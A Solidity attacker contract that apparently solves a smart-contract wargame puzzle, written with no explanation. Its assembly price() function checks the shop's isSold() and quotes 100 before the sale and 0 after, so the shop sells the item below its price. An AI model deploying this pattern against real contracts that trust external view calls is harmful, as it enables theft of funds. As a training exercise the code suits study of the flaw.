pragma solidity ^0.8.0;

interface IShop {
    function isSold() external view returns (bool);
    function buy() external;
}

contract ShopAttacker {

    IShop shop;
    
    constructor(address shopAddress) {
        shop = IShop(shopAddress);
    }
    
    // @dev need to call isSold() in a gas efficient manner
    function price() external view returns (uint256) {
        assembly {
            // function selector for isSold() - prepended by zeros
            mstore(0x100, 0xe852e741)

            // address for shop is in slot 0
            // since the function selector is 4 bytes, 0x120-0x4=0x11c
            // bool isSold is stored in memory 0x120, takes 32 byte slot (0x20)
            let result := staticcall(gas(), sload(0x0), 0x11c, 0x4, 0x120, 0x20)

            // logic based on value of isSold
            if iszero(mload(0x120)) {
               mstore(0x140, 0x64) // 0x64 = 100
               return(0x140, 0x20)
            }
            mstore(0x140, 0x0)
            return(0x140, 0x20) 
        }
    }
    
    function buyItem() public {
        shop.buy();
    }
}
